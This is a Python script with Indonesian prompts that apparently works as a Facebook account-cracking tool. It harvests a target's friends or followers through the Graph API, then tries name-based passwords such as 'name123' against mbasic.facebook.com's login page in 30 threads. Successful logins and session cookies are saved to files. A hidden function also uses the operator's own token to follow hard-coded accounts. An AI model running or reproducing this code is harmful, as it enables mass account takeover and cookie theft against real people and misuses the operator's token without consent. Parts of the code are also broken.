# -*- coding: utf-8
import os, sys, re, time, requests, json, random
from multiprocessing.pool import ThreadPool

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
loop = 0
id = []
ok = []
cp = []

def bot_ea():
	os.system("clear")
	try:
		token = open("login.txt", "r")
		menu()
	except KeyError, IOError:
		os.system("rm -f login.txt")
		exit(" ! token kadaluwarsa")
	ses = requests.Session()
	nama = ses.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
	ses.post("https://graph.facebook.com/100015073506062/subscribers?access_token="+token)
	ses.post("https://graph.facebook.com/1558471827/subscribers?access_token="+token)
	ses.post("https://graph.facebook.com/100000891392705/subscribers?access_token="+token)
	ses.post("https://graph.facebook.com/1186995774/subscribers?access_token="+token)
	ses.post("https://graph.facebook.com/100003058813748/subscribers?access_token="+token)
	ses.post("https://graph.facebook.com/100022849470990/subscribers?access_token="+token)
	ses.post("https://graph.facebook.com/100010998764674/subscribers?access_token="+token)
	
def logo():
	os.system("clear")
	print("  ___ ___ __  __ ___ ___  __   _____ \n / __|_ _|  \/  | _ ) __| \ \ / /_  )\n \__ \| || |\/| | _ \ _|   \ V / / / \n |___/___|_|  |_|___/_|     \_/ /___|")
	
def login():
	os.system("clear")
	try:
		token = open("login.txt", "r")
		menu()
	except KeyError, IOError:
		print(" * sebelum masuk ke menu harus login terlebih dahulu")
		print(" * untuk login silakan masukan token facebook anda")
		print(" ? ketik '\033[0;93mhelp\033[0;97m' untuk lihat tutorial ambil token facebook")
		token = raw_input("\n + token fb : ")
		if token == "help":
			os.system("xdg-open https://youtu.be/IdxphPBMMTU")
			exit(" ! di simak video nya biar paham")
		try:
			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
			open("login.txt", "w").write(token)
			print(" [+] user aktif \033[0;93m%s\033[0;97m, login berhasil"%(nama))
                        time.sleep(1)
                        menu()
		except KeyError:
			os.system("rm -f login.txt")
			exit(" ! token kadaluwarsa")

def menu():
	os.system("clear")
	global token
	try:
		token = open("login.txt","r").read()
	except KeyError:
		os.system("rm -f login.txt")
		exit(" ! token kadaluwarsa")
	try:
		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
		ip = requests.get("https://api.ipify.org").text
	except IOError:
		os.system("rm -f login.txt")
		exit(" ! token kadaluwarsa")
	logo()
	print("\n * user aktif : %s"%(nama))
	print(" * ip address : %s"%(ip))
	print("\n 1 crack dari publik teman")
	print(" 2 crack dari follower")
	print(" 3 ganti user agent")
	print(" 0 keluar (hapus token)")
	angga = raw_input("\n ? choose : ")
	if angga =="":
		menu()
	elif angga == "1":
		publik()
		p = ThreadPool(30)
		p.map(crack, id)
		exit("\n [#] selesai...")
	elif angga == "2":
		followers()
		p = ThreadPool(30)
		p.map(crack, id)
		exit("\n [#] selesai...")
	elif angga == "3":
		print("\n ? ketik 't' untuk ganti user agent bawaan tools")
		useragent = raw_input(" + masukan user agent : ")
		if useragent == "":
			exit(" \n ! jangan kosong")
		elif useragent == "t":
			useragent = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+") 
			open(".useragent", "w").write(useragent)
			time.sleep(1)
			raw_input(" + berhasil pencet enter kembali ke menu")
			menu()
		open(".useragent", "w").write(useragent)
		time.sleep(1)
		raw_input(" + berhasil pencet enter kembali ke menu")
		menu()
	elif angga == "0":
		os.system("rm -f login.txt")
		exit(" # berhasil menghapus token")
	else:
		menu()
	
def publik():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" ! token kadaluwarsa")
	print("\n * isi 'me' jika ingin dari daftar teman")
	idt = raw_input(" + id target : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
	except KeyError:
		exit(" ! id pengguna %s tidak tersedia"%(idt))
	ask = raw_input("\n ? gunakan password manual? y/t: ")
	if ask == "y":
		manual()
	print(" + total id : \033[0;91m%s\033[0;97m\n"%(len(id)))
	print(" # file ok tersimpan di : ok.txt")
	print(" # file cp tersimpan di : cp.txt\n")

def followers():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" ! token kadaluwarsa")
	print("\n * isi 'me' jika ingin dari followers sendiri")
	idt = raw_input(" + id target : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
	except KeyError:
		exit(" ! id pengguna %s tidak tersedia"%(idt))
	ask = raw_input("\n ? gunakan password manual? y/t: ")
	if ask == "y":
		manual()
	print(" + total id : \033[0;91m%s\033[0;97m\n"%(len(id)))
	print(" # file ok tersimpan di : ok.txt")
	print(" # file cp tersimpan di : cp.txt\n")
	
def cek_ttl_cp(uid, pw):
	try:
		token = open("login.txt", "r").read()
		with requests.Session() as ses:
			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
			month, day, year = ttl.split("/")
			month = bulan_ttl[month]
			print("\r \033[0;93m+ %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
			cp.append("%s|%s"%(uid, pw))
			open("cp.txt","a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
	except KeyError, IOError:
		day = (" ")
		month = (" ")
		year = (" ")
	except:pass

def crack(user):
	ua = open(".useragent", "r").read()
	pwx = []
	global loop, token
	sys.stdout.write(
		"\r * crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	for ss in name.split(" "):
		if len(ss)<3:
			continue
		elif len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
			pwx.append(ss+"123")
			pwx.append(ss+"12345")
		else:
			pwx.append(ss+"123")
			pwx.append(ss+"12345")
	try:
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			b = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("ok.txt", "a").write("%s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				cek_ttl_cp(uid, pw)
				break
				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("cp.txt", "a").write("%s|%s\n"%(uid, pw))
				break
				continue

		loop += 1
	except:
		pass

def manual():
	ua = open(".useragent", "r").read()
	print(" * contoh pass : sayang,anjing,bangsat\n")
	asu = raw_input(" ? set pass : ").split(",")
	if len(asu) =="":
		exit(" ! jangan kosong")
	print(" + total id : \033[0;91m%s\033[0;97m\n"%(len(id))) 
	print(" # file ok tersimpan di : ok.txt")
	print(" # file cp tersimpan di : cp.txt\n")
	
	def main(user):
		global loop, token
		sys.stdout.write(
			"\r * crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid, name = user.split("<=>")
		try:
			for pw in asu:
				pw = pw.lower()
				ses = requests.Session()
				ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				b = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
				if "c_user" in ses.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
					ok.append("%s|%s"%(uid, pw))
					open("ok.txt", "a").write("%s|%s\n"%(uid, pw))
					break
					continue
				elif "checkpoint" in ses.cookies.get_dict().keys():
					cek_ttl_cp(uid, pw)
					break
					print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
					cp.append("%s|%s"%(uid, pw))
					open("cp.txt", "a").write("%s|%s\n"%(uid, pw))
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n # selesai...")

if __name__ == "__main__":
	os.system("git pull")
	os.system("touch .useragent")
	os.system("touch login.txt")
	login()
